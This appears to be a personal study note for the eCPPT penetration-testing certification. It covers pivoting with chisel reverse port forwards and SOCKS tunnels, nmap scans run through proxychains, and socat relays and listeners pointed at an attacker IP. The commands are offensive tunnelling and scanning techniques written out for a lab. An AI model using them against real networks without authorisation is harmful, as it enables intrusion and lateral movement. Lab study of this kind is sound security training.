
## Chisel
https://github.com/jpillora/chisel *looking for releasses*

**Important:** For eCCPT, it's recommended to use chisel v1.5

`$./chisel client 192.168.111.106:1234 R:80:10.10.0.129:80` *Portforwarding of 10.10.0.129 in port 80 to the attacker port 80, All this by attacker's 1234 port*
![[Pasted image 20240317152146.png]]
`$./chisel client 192.168.111.106:1234 R:socks`*for all ports, we use a tunnel socks5

By default with R:socks, the port given is 1080

![[Pasted image 20240317152257.png]]
#### Proxychains file configuration

For each new tunnel created, we need to updated **/etc/proxychains.conf**

![[Pasted image 20240317152056.png]]

#### Command usage with proxychains
##### Important
For nmap using proxychains we need to specify a TCP scan -sT
Not working....
![[Pasted image 20240317152608.png]] `$proxychains nmap -sT --top-ports 500 -open -T5  -v -n 10.10.2.131 2>/dev/null` *sterr sent to /dev/null*

Since it takes too long, we can use xargs to work with threads:

`$seq 1 65535 | xargs -P 500 -I {} proxychains nmap -sT -Pn -p{} -open -T5  -v -n 10.10.2.131 2>&1 | grep "tcp open"` 

We can follow how the scan is going by verifying the process:

`$ps -faux | grep nmap | tail -n 2 | head -n 1`
>blinds    274432  0.0  0.1  99232 11596 pts/3    Rl+  21:52   0:00      |   \_ nmap -sT -Pn -p48832 -open -T5 -v -n 10.10.2.131

![[Pasted image 20240317155644.png]]

### Web proxy configuration
We use SOCKS5 proxy type, we send all communications to localhost which by using proxychains will send to the specified port.
![[Pasted image 20240317160015.png]]

# Socat

Uploading file:

`$scp socat dimitri@172.16.1.129:/tmp/socat`

`./socat TCP-LISTEN 4444,fork TCP:172.16.1.19:80` *172.16.1.19 is the attacker IP and the port listening*

## Socat as listening
Same function as *nc -lvnp* 

`socat TCP-LISTEN:5555 stdout`
